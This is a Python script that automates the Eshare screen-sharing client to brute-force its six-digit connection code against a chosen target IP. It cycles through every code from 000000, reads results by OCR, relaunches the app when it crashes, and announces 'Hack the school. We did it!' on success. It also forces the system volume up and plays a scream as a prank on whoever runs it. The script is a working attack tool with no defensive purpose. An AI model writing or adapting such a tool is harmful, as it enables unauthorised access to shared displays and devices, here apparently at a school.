import pyautogui
import pytesseract
import time
from pynput.mouse import Listener
import threading
import subprocess
import pyttsx4

# Variables for locations (you can adjust these as needed)
GENERAL_OK_BUTTON = (1080, 730)
GENERAL_FIELD = (900, 730)
TARGET_OK_BUTTON = (1000, 590)
TRY_AGAIN_BUTTON = (960, 615)
TEXT_FIELD = (1000, 725)
TARGET_IP = input("Enter the target ip: ") 
# defines the espeak scream
def espeakscream():
    subprocess.run(['espeak', '-a', '200', '-p', '90', '-s', '50', 'AAAAAA AAAAAAAHHHHHH!'])
# asks the user if they want to use espeak instead of print statements
espeakconfirm = input("Do you want to use espeak? (Y/n) ")
if espeakconfirm.lower() == "" or espeakconfirm.lower() == "y" or espeakconfirm.lower() == "yes":
    espeakconfirm = True
else:
    espeakconfirm = False
    print("\nWhat! No Espeak??\n")
# sets system volume to 50% to prepare for pyttsx4
subprocess.run(['amixer', '-D', 'pulse', 'set', 'Master', 'unmute' ],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL)
subprocess.run(['amixer', 'set', 'Master', '88%' ],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL)
# user torture :)
if espeakconfirm == False:
    subprocess.run(['espeak', '-p', '60', '-s', '150', 'YOU WILL NEVER GET RID OF ME'])
    espeakscream()

# initializes tts (text-to-speech)
if espeakconfirm == True:
    engine = pyttsx4.init()
    engine.setProperty('rate', 150)
    engine.setProperty('volume', 0.5)
    text = "Starting my beautiful macro"
    engine.say(text)
    engine.runAndWait()
else:
    print("Starting my beautiful macro...")
# Global stop event to control the macro
stop_event = threading.Event()

# Function to stop the macro when a right-click is detected
def on_click(x, y, button, pressed):
    if pressed and button.name == 'right':
        if espeakconfirm == False:
            print("Right-click detected, stopping the macro...\n")
            stop_event.set()
        else: 
            subprocess.run(['espeak', '-p', '50', '-s', '150', 'Right click detected. Going down...'])
            # espeakscream()
            stop_event.set()

# Function to start listening for mouse events in a separate thread
def start_mouse_listener():
    listener = Listener(on_click=on_click)
    listener.start()

# Function to run the macro
def run_macro():
    time.sleep(2)  # Wait for the screen to be ready
    print ("\nTo exit this macro, simply right-click.\n")



    for number in range(1000000):
        if stop_event.is_set():
            if espeakconfirm == False:
                print("Macro stopped.\n")
                break
            else: 
                subprocess.run(['espeak', '-p', '50', '-s', '150', 'Macro stopped. See you soon!'])
                break
        else: 
            pyautogui.moveTo(TRY_AGAIN_BUTTON)
            pyautogui.click()
            pyautogui.typewrite(str(f"{number:06d}"))
            crashtest = pyautogui.screenshot(region=(820, 460, 280, 100))
            crashtext = pytesseract.image_to_string(crashtest)
            if "please" not in crashtext: # determines if Eshare crashed or not (usually happens every 1000 attempts)
                if espeakconfirm == True:
                    subprocess.run(['espeak', '-p', '50', '-s', '150', 'E-Share crashed.'])
                    espeakscream()
                    subprocess.run(['espeak', '-p', '50', '-s', '150', 'Rebooting E-Share. '])
                else: 
                    print(f"Eshare couldn't handle our greatness! The last attempted number was {number}. Rebooting Eshare and continuing...\n")
                pyautogui.press("win")
                pyautogui.typewrite("Eshare")
                pyautogui.press("enter")
                time.sleep(1)
                pyautogui.moveTo(TEXT_FIELD)
                pyautogui.click()
                pyautogui.typewrite(TARGET_IP)
                pyautogui.moveTo(GENERAL_OK_BUTTON)
                pyautogui.click()
                pyautogui.typewrite(str(f"{number:06d}"))
        

            pyautogui.moveTo(TARGET_OK_BUTTON)
            pyautogui.click()
            time.sleep(0.2)
        
            screenshot = pyautogui.screenshot(region=(820, 560, 280, 40))
            text = pytesseract.image_to_string(screenshot)

            if "connected" in text:
                if espeakconfirm == False:
                    print(f"Success! The Code is {number}\n")
                    break
                else: 
                    subprocess.run(['espeak', '-p', '50', '-s', '150', 'Hack the school. We did it!'])
                    break

# Start the mouse listener thread
mouse_listener_thread = threading.Thread(target=start_mouse_listener)
mouse_listener_thread.start()

# Start the macro thread
macro_thread = threading.Thread(target=run_macro)
macro_thread.start()

# Wait for the macro to finish
macro_thread.join()

# Stop the mouse listener when the macro finishes
mouse_listener_thread.join()
